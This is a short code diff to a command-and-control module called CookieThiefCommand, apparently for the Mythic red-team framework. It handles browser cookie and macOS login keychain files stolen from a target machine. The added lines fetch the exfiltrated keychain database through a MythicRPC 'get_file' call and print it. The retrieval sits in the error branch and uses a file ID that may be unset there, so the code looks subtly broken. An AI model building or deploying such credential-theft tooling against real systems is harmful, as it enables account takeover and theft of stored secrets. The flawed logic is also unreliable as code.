@@ -68,12 +68,16 @@ class CookieThiefCommand(CommandBase):
             for responses in dlResponses["files"]:
                 if responses["filename"] == "login.keychain-db":
                     keychainDBFileId = responses["agent_file_id"]
-            print("Cookies agent_file_id: " + cookiesFileId)
-            sys.stdout.flush()
-            print("Keychain agent_file_id: " + keychainDBFileId)
-            sys.stdout.flush()
-            return task
         else:
             print("Encountered an error attempting to get responses from tasks: " + dlResponses.error)
             sys.stdout.flush()
-            return task
+
+            getkeychainDBResp = await MythicRPC().execute("get_file", task_id=task.id, agent_file_id=keychainDBFileId)
+            if getkeychainDBResp.status == "success":
+                getkeychainDBResp = getkeychainDBResp.response
+                print(getkeychainDBResp)
+            else:
+                print("Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
+                sys.stdout.flush()
+
+        return task
